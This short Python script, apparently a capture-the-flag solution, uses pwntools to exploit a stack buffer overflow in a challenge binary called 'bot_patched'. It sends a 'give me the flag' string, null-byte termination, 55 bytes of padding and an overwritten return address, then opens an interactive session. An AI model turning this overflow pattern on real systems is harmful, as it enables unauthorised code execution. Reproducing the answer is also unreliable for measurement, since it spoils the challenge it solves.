#!/usr/bin/env python3

from pwn import *

exe = ELF("./docker/bot_patched")
libc = ELF("./docker/libc-2.31.so")
ld = ELF("./docker/ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 5000)

    return r


def main():
    r = conn()

    r.sendline(b"give me the flag\x00" + b'A'*55 + p64(0x000000000040128e))

    r.interactive()


if __name__ == "__main__":
    main()
